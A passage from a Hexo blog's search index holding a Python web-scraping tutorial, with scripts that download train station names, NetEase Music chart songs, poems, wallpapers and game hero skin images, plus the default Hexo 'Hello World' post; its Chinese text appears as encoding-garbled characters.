class="keyword">try</span>:</span><br><span class="line">        headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">        response = requests.get(url,headers = headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> RequestException:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&quot;https://kyfw.12306.cn/otn/resources/js/framework/station_name.js&quot;</span></span><br><span class="line">    data = getResponse(url)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        dict_data = &#123;&#125;</span><br><span class="line">        text = data.text</span><br><span class="line">        str_split = text.split(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> chars <span class="keyword">in</span> str_split[<span class="number">1</span>:]:</span><br><span class="line">            station = chars.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">            dict_data[station[<span class="number">1</span>]] = station[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;stations.json&quot;</span>,<span class="string">&#x27;w&#x27;</span>,encoding = <span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">            json.dump(dict_data,fp,ensure_ascii = <span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h4 id="ç½‘æ˜“äº‘çƒ­æ­Œçˆ¬å–"><a href="#ç½‘æ˜“äº‘çƒ­æ­Œçˆ¬å–" class="headerlink" title="ç½‘æ˜“äº‘çƒ­æ­Œçˆ¬å–"></a>ç½‘æ˜“äº‘çƒ­æ­Œçˆ¬å–</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 163MusicGet.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|\âœ©\Ëš\*\â€¢Ì©Ì©Í™Êš]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#å„ä¸ªç¬¦å·é—´ç”¨è½¬ä¹‰å­—ç¬¦éš”å¼€</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;music\\&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://music.163.com/discover/toplist?id=19723756&quot;</span> <span class="comment">#ä¸åŒæ¦œå•åˆ‡æ¢è¯¥idå³å¯</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url=url,headers=headers)</span><br><span class="line">html_data = re.findall(<span class="string">&#x27;&lt;li&gt;&lt;a href=&quot;/song\?id=(\d+)&quot;&gt;(.*?)&lt;/a&gt;&#x27;</span>,response.text) <span class="comment"># ï¼Ÿå‰é¢è®°å¾—åŠ ä¸ªè½¬ä¹‰å­—ç¬¦</span></span><br><span class="line"><span class="keyword">for</span> music_id,music_name <span class="keyword">in</span> html_data:</span><br><span class="line"><span class="comment"># ä¸‹è½½åœ°å€ï¼šhttps://music.163.com/song/media/outer/url?id=1933915376.mp3</span></span><br><span class="line">music_url = <span class="string">f&quot;https://music.163.com/song/media/outer/url?id=<span class="subst">&#123;music_id&#125;</span>.mp3&quot;</span></span><br><span class="line">music_content = requests.get(url=music_url,headers=headers).content</span><br><span class="line">music_name = change_name(music_name)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename + music_name +<span class="string">&#x27;.mp3&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(music_content)</span><br><span class="line"><span class="built_in">print</span>(music_id,music_name)</span><br></pre></td></tr></table></figure><p>MP3æ–‡ä»¶ä¿å­˜åœ¨musicæ–‡ä»¶å¤¹ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/04/06/u73hIWizV69jsMb.png" alt="image-20220406084013424.png"></p><h4 id="å¤è¯—è¯çˆ¬å–"><a href="#å¤è¯—è¯çˆ¬å–" class="headerlink" title="å¤è¯—è¯çˆ¬å–"></a>å¤è¯—è¯çˆ¬å–</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PoetryGet.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.oh100.com/shici/1127009.html&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url=url,headers=headers)</span><br><span class="line">response.encoding = response.apparent_encoding</span><br><span class="line">li = re.findall(<span class="string">&quot;\d+?ã€(.*?)&lt;/p&gt;&lt;p&gt;&quot;</span>,response.text)</span><br><span class="line">li[-<span class="number">1</span>] = re.sub(<span class="string">r&quot;&lt;/p&gt;&lt;script&gt;s\(\&quot;content_relate\&quot;\)\;\&lt;\/script\&gt;\&lt;p\&gt;\ã€å½¢å®¹æ´’è„±çš„è¯—è¯\ã€‘ç›¸å…³æ–‡ç« \ï¼š&quot;</span>,<span class="string">&quot;&quot;</span>,li[-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> se <span class="keyword">in</span> li:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;- &quot;</span>+se)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/06/JXvfrT9FMqRDAPa.png" alt="image-20220406084235256.png"></p><h4 id="å£çº¸çˆ¬å–"><a href="#å£çº¸çˆ¬å–" class="headerlink" title="å£çº¸çˆ¬å–"></a>å£çº¸çˆ¬å–</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># WallPaperGet.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">æ•´ä½“æ€è·¯ï¼š</span></span><br><span class="line"><span class="string">1ã€è®¿é—®ç½‘ç«™æŸ¥çœ‹ä¿¡æ¯ï¼ˆF12ä¸å¯ç”¨å¯ä»¥å…ˆåœ¨åˆ«çš„ç½‘é¡µæ‰“å¼€å†è®¿é—®è¯¥ç½‘å€ï¼‰</span></span><br><span class="line"><span class="string">2ã€è¿›å…¥å¯¹åº”tagè§‚å¯Ÿrequestçš„headersç­‰ä¿¡æ¯ï¼ˆæ³¨æ„è¦ç‚¹å‡»åŠ è½½æ›´å¤šåå†çœ‹XHRä¸‹çš„æ–‡ä»¶ï¼‰</span></span><br><span class="line"><span class="string">3ã€è¿›å…¥ç‰¹å®šç…§ç‰‡è§‚å¯Ÿä¿¡æ¯</span></span><br><span class="line"><span class="string">4ã€åœ¨textå±æ€§ä¸­è·å–titleã€img_urlç­‰ä¿¡æ¯</span></span><br><span class="line"><span class="string">5ã€åœ¨æœ¬åœ°ä¿å­˜ä¸‹æ¥</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;img\\&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_title</span>(<span class="params">name</span>): <span class="comment">#é‡å‘½åæ–‡ä»¶ï¼Œé˜²æ­¢åŸæœ‰ä¿å­˜æ–‡ä»¶åä¸åˆæ³•</span></span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#å„ä¸ªç¬¦å·é—´ç”¨è½¬ä¹‰å­—ç¬¦éš”å¼€</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>): <span class="comment">#æŒ‡å®šé¡µæ•°</span></span><br><span class="line">url = <span class="string">f&quot;https://m.bcoderss.com/tag/%e7%be%8e%e5%a5%b3/page/<span class="subst">&#123;page&#125;</span>/&quot;</span> <span class="comment"># %e7%be%8e%e5%a5%b3ä»£è¡¨äº†ç¾å¥³è¿™ä¸ªæ ‡ç­¾ï¼Œå¯ä»¥è‡ªè¡Œé€‰æ‹©</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,headers=headers) <span class="comment">#è¯¥ç½‘ç«™æ˜¯ä¸ªpostè¯·æ±‚ä½†æ˜¯ä¸éœ€è¦ä¼ params</span></span><br><span class="line"><span class="comment"># print(response.text)</span></span><br><span class="line">href = re.findall(<span class="string">&#x27;&lt;li&gt;&lt;a target=&quot;_blank&quot; href=&quot;(.*?)&quot;&#x27;</span>,response.text)[<span class="number">2</span>:] <span class="comment">#æ‰¾åˆ°æ‰€æœ‰çš„ç…§ç‰‡åˆå§‹åœ°å€ï¼Œå‰ä¸¤ä¸ªæ˜¯æ— ç”¨åœ°å€</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> href:</span><br><span class="line">response_1 = requests.get(url=index,headers=headers) <span class="comment">#è®¿é—®ç…§ç‰‡åˆå§‹åœ°å€</span></span><br><span class="line">title = re.findall(<span class="string">&quot;&lt;title&gt;(.*?)&lt;/title&gt;&quot;</span>,response_1.text)[<span class="number">0</span>] <span class="comment">#è·å–ç…§ç‰‡æ ‡é¢˜</span></span><br><span class="line">title = change_title(title)</span><br><span class="line">img_url = re.findall(<span class="string">&#x27;&lt;img alt=&quot;.*?&quot; title=&quot;.*?&quot; src=&quot;(.*?)&quot;&gt;&#x27;</span>,response_1.text)[<span class="number">0</span>] <span class="comment">#è·å–ç…§ç‰‡ä¸‹è½½åœ°å€</span></span><br><span class="line">img_content = requests.get(url=img_url,headers=headers).content <span class="comment">#è·å–ç…§ç‰‡å†…å®¹</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename + title + <span class="string">&#x27;.jpg&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f: <span class="comment">#ä¿å­˜ç…§ç‰‡</span></span><br><span class="line">f.write(img_content)</span><br><span class="line"><span class="built_in">print</span>(title,img_url)</span><br></pre></td></tr></table></figure><p>å£çº¸ä¼šä¿å­˜åœ¨imgæ–‡ä»¶å¤¹ä¸‹ï¼ˆå›¾ç‰‡ä¸æ˜¯å¾ˆé€‚åˆæ”¾å‡ºæ¥ï¼Œå°±æ”¾ä¸‹æ–‡å­—å§â€¦ï¼‰</p><p><img src="https://s2.loli.net/2022/04/06/hgFZor87UKQkRjd.png" alt="image-20220406084429168.png"></p><h4 id="LOLè‹±é›„çš®è‚¤å›¾ç‰‡çˆ¬å–"><a href="#LOLè‹±é›„çš®è‚¤å›¾ç‰‡çˆ¬å–" class="headerlink" title="LOLè‹±é›„çš®è‚¤å›¾ç‰‡çˆ¬å–"></a>LOLè‹±é›„çš®è‚¤å›¾ç‰‡çˆ¬å–</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># LOL.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|\âœ©\Ëš\*\â€¢Ì©Ì©Í™Êš]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#å„ä¸ªç¬¦å·é—´ç”¨è½¬ä¹‰å­—ç¬¦éš”å¼€</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_img</span>(<span class="params">name,title,skin_name,skin_url</span>):</span><br><span class="line">filename = <span class="string">f&#x27;<span class="subst">&#123;name+title&#125;</span>\\&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line">content = requests.get(url=skin_url,headers=headers).content</span><br><span class="line">newname = change_name(skin_name)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename+newname+<span class="string">&#x27;.jpg&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(content)</span><br><span class="line"><span class="built_in">print</span>(skin_name)</span><br><span class="line"></span><br><span class="line">hero_list_url = <span class="string">&quot;https://game.gtimg.cn/images/lol/act/img/js/heroList/hero_list.js?ts=2748291&quot;</span></span><br><span class="line">response = requests.get(url=hero_list_url,headers=headers)</span><br><span class="line">hero_list = response.json()[<span class="string">&#x27;hero&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> hero <span class="keyword">in</span> hero_list:</span><br><span class="line">hero_id = hero[<span class="string">&#x27;heroId&#x27;</span>]</span><br><span class="line">hero_name = hero[<span class="string">&#x27;name&#x27;</span>] </span><br><span class="line">hero_title = hero[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">hero_url = <span class="string">f&quot;https://game.gtimg.cn/images/lol/act/img/js/hero/<span class="subst">&#123;hero_id&#125;</span>.js&quot;</span></span><br><span class="line">response_1 = requests.get(url=hero_url,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(hero_id,hero_name,hero_title)</span><br><span class="line">skin_list = response_1.json()[<span class="string">&#x27;skins&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> skin <span class="keyword">in</span> skin_list:</span><br><span class="line"><span class="keyword">if</span>(skin[<span class="string">&#x27;mainImg&#x27;</span>]):</span><br><span class="line">skin_url = skin[<span class="string">&#x27;mainImg&#x27;</span>]</span><br><span class="line">skin_name = skin[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">save_img(hero_name,hero_title,skin_name,skin_url)</span><br><span class="line"><span class="comment"># print(skin_url)</span></span><br></pre></td></tr></table></figure><p>å„ä¸ªè‹±é›„çš„çš®è‚¤ä¼šä¿å­˜åœ¨è‡ªå·±çš„æ–‡ä»¶ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/04/06/LEcIVRNbux1rnDA.png" alt="image-20220406084813906.png"></p><p><img src="https://s2.loli.net/2022/04/06/R4XxZkbLVtwQcHe.png" alt="image-20220406084841993.png"></p><h4 id="ç‹è€…è£è€€è‹±é›„çš®è‚¤çˆ¬å–"><a href="#ç‹è€…è£è€€è‹±é›„çš®è‚¤çˆ¬å–" class="headerlink" title="ç‹è€…è£è€€è‹±é›„çš®è‚¤çˆ¬å–"></a>ç‹è€…è£è€€è‹±é›„çš®è‚¤çˆ¬å–</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># wzry.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|\âœ©\Ëš\*\â€¢Ì©Ì©Í™Êš]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#å„ä¸ªç¬¦å·é—´ç”¨è½¬ä¹‰å­—ç¬¦éš”å¼€</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_img</span>(<span class="params">name,title,skin_name,skin_url</span>):</span><br><span class="line">filename = <span class="string">f&quot;<span class="subst">&#123;title+name&#125;</span>\\&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line">content = requests.get(url=skin_url,headers=headers).content</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename+skin_name+<span class="string">&#x27;_&#x27;</span>+name+<span class="string">&#x27;.jpg&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(content)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">herolist_url = <span class="string">&quot;https://pvp.qq.com/web201605/js/herolist.json&quot;</span></span><br><span class="line">herolist = requests.get(url=herolist_url,headers=headers).json()</span><br><span class="line"><span class="keyword">for</span> hero <span class="keyword">in</span> herolist:</span><br><span class="line">hero_ename = hero[<span class="string">&#x27;ename&#x27;</span>]</span><br><span class="line">hero_name = hero[<span class="string">&#x27;cname&#x27;</span>]</span><br><span class="line">hero_title = hero[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(hero_ename,hero[<span class="string">&#x27;cname&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;skin_name&#x27;</span> <span class="keyword">in</span> hero):</span><br><span class="line">skin_list = hero[<span class="string">&#x27;skin_name&#x27;</span>].split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">hero_url = <span class="string">f&quot;https://pvp.qq.com/web201605/herodetail/<span class="subst">&#123;hero_ename&#125;</span>.shtml&quot;</span></span><br><span class="line">response = requests.get(url=hero_url,headers=headers)</span><br><span class="line">response.encoding = response.apparent_encoding</span><br><span class="line">tu = re.findall(<span class="string">&#x27;&lt;ul class=\&quot;pic-pf-list pic-pf-list3\&quot; data-imgname=\&quot;(.*?)\&amp;0\|(.*?)\&amp;0\|(.*?)\&amp;72\&quot;&gt;&#x27;</span>,response.text)</span><br><span class="line">skin_list = <span class="built_in">list</span>(tu[<span class="number">0</span>])</span><br><span class="line">skin_lens = <span class="built_in">len</span>(skin_list)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(skin_lens):</span><br><span class="line">skin_url = <span class="string">f&quot;https://game.gtimg.cn/images/yxzj/img201606/heroimg/<span class="subst">&#123;hero_ename&#125;</span>/<span class="subst">&#123;hero_ename&#125;</span>-bigskin-<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>.jpg&quot;</span></span><br><span class="line">skin_name = skin_list[i]</span><br><span class="line">save_img(hero_name,hero_title,skin_name,skin_url)</span><br><span class="line"><span class="built_in">print</span>(skin_name,hero_name)</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶ä¿å­˜æ€è·¯ä¸LOLä¸€è‡´ï¼š</p><p><img src="https://s2.loli.net/2022/04/06/qpJTLrSeatgcbKk.png" alt="image-20220406085029196.png"></p><p><img src="https://s2.loli.net/2022/04/06/6RMvwCJk37HqOfi.png" alt="image-20220406085046682.png"></p><h4 id="æœªå®Œå¾…ç»­â€¦â€¦"><a href="#æœªå®Œå¾…ç»­â€¦â€¦" class="headerlink" title="æœªå®Œå¾…ç»­â€¦â€¦"></a>æœªå®Œå¾…ç»­â€¦â€¦</h4>]]></content>
      
      
      <categories>
          
          <category> çˆ¬è™« </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> çˆ¬è™« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/04/05/hello-world/"/>
      <url>/2022/04/05/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> Test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test1 </tag>
            
            <tag> test2 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
